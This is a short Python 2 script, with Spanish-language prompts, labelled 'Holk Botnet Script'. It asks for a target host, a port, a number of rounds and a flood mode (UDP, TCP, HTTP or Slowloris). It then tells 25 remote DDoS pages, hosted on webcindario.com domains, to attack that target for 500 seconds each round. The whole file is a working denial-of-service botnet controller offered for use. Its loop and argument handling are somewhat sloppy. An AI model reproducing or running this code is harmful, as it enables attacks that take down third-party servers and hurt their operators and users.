import warnings
from grab import Grab
import sys
import re

print "\n"
print "                       Holk Botnet Script beta 0.1.0\n";

print "	  88   88   .d8b.   NNNNNN  88       	88      88    88";
print "	  88, ,88  d8' '8b    88    88       	88      88,  ,88 ";
print "	  00ooo88  88ooo88    88    88       	88      00oooo88  ";
print "	  88   88  88~~~88    88    88b      	88b     88    88  ";
print "	  88   88  88   88  NNNNNN  88NNNN   	88NNNN  88    88  ";

print "	  ======================================================\n";

try:
	hostname = sys.argv[1]
	port = sys.argv[2]

except:
	hostname = sys.argv[0]
	port = sys.argv[1]

warnings.filterwarnings("ignore")

rondas = raw_input("\n\n Cuantas rondas desea ejecutar ? (numeros): ")
rondas2 = rondas
rondas = 1

print "\n Por favor elije uno de los siguientes modos de ataque:\n"
print " 1- UDP"
print " 2- TCP"
print " 3- HTTP"
print " 4- SLOWLORIS\n"

mode = raw_input('\n\n Por favor escribe el numero: ')

try:
	if (mode == "1"):
		mode = "UDP"
	if (mode == "2"):
		mode = "TCP"
	if (mode == "3"):
		mode = "HTTP"
	if (mode == "4"):
		mode = "SLOWLORIS"

except:
	pass

print "\n"
print " Atacando Servidor.............\n\n"

g = Grab(timeout=120)

numerosalv = 1

while (rondas <= rondas2):
	while (numerosalv <= 25):

		if (numerosalv <= 25):
			response = g.go("http://holkddos" + str(numerosalv) + ".webcindario.com/ddos.php")
		else:
			print " Servidor Atacado , no estoy seguro de que haya caido"
			exit()

		g.set_input('host', hostname)
		g.set_input('port', port)
		g.set_input('time', '500')
		g.set_input('type', mode)

		g.submit()

		g.set_input('host', hostname)
		g.set_input('time', '500')

		g.submit()

		if (numerosalv < 25):
			numerosalv = numerosalv + 1
		rondas = rondas + 1
		print " Servidor " + str(numerosalv) + " A Atacado"

	print "\n Ronda " + str(rondas) + " Completada."